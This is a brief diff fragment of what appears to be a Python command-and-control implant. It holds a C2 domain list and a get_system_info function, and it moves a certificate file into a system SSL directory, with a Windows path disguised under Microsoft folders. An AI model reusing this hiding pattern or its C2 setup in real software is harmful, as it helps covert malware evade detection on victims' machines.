@@ -27,7 +27,7 @@ C2_DOMAINS = ["https://midevil-scoring-engine.com",
 if platform.system() == "Windows":
     CERT_PATH = r"C:\ProgramData\Microsoft\Network\Settings\cert.crt"
 else:
-    CERT_PATH = r"/opt/system-svc/cert.crt"
+    CERT_PATH = r"/etc/ssl/certs/cert.crt"
 
 
 def get_system_info():
